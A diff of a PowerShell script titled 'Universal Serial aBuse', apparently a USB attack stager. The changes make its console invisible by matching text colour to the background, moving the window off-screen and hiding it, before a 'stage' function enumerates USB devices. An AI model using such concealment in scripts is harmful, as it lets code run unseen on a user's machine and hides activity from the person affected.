@@ -1,6 +1,5 @@
 $ui = $Host.UI.RawUI
-$ui.BackgroundColor = 'Black'
-$ui.ForegroundColor = 'White'
+$ui.ForegroundColor = $ui.BackgroundColor
 Clear
 
 $ui.WindowTitle = 'Universal Serial aBuse'
@@ -27,10 +26,10 @@ namespace n {
 '.Replace('%',[char]34)
 Add-Type -TypeDefinition $cs
 $h = (Get-Process -Id $pid).MainWindowHandle
-$null = [n.w]::SetWindowPos($h, -2, 20, 20, 40, 40, 5)
+$null = [n.w]::SetWindowPos($h, -2, 2000, 2000, 40, 40, 5)
 
 function stage() {
-	#$null = [n.w]::ShowWindowAsync($h, 6)
+	$null = [n.w]::ShowWindowAsync($h, 0)
 	$devs = gwmi Win32_USBControllerDevice
 	foreach ($dev in $devs) {
 		$wmidev = [wmi]$dev.Dependent
